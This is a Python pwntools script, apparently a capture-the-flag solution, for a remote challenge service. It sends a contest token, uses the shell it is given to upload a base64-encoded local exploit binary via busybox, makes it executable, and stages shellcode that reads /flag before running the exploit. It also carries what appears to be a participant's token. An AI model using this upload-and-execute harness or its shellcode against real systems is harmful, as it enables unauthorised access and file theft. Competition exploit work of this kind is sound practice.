#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *
import base64
import time

#  context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

LOCAL = 0

#  filename = "./pwn"
if LOCAL:
    pass
    #  p = process(filename)
else:
    remote_service = "202.38.93.111 10337"
    remote_service = remote_service.strip().split(" ")
    p = remote(remote_service[0], int(remote_service[1]))
#  e = ELF(filename, checksec=False)
#  l = ELF(e.libc.path, checksec=False)


rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
    if LOCAL:
        lg("p.pid")
        input()
    pass

#  debugPID()

ru(b"Please input your token: ")
sl(b"1119:MEUCIQDUCFthMiI3h5RpZfMZqW1G4wYw8CauHcL0KB6A0DbizgIgVq8QvPkUd9uVtFyjHGqW5p5K3toOCls8PhS5kqKE728=")

ru(b'Here is the shell! U have 10s to make you one-byte-man! :)')
ru(b'\r\n')

sl(b"echo -n -e '\x90' > /shellcode")
with open("./exp0", "rb") as fd_exp:
    data1_4_send = base64.b64encode(fd_exp.read())
sl(b"echo " + data1_4_send + b" > /exp.b64")
time.sleep(1)
sl(b"/busybox base64 -d /exp.b64 > /exp")
time.sleep(1)
sl(b"chmod +x /exp")
sc = base64.b64encode(asm("nop; nop; nop; nop;" + shellcraft.cat("/flag")))
sl(b"echo " + sc + b" > /data.b64")
sl(b"/busybox base64 -d /data.b64 > /data")
sl(b"/exp")



irt()
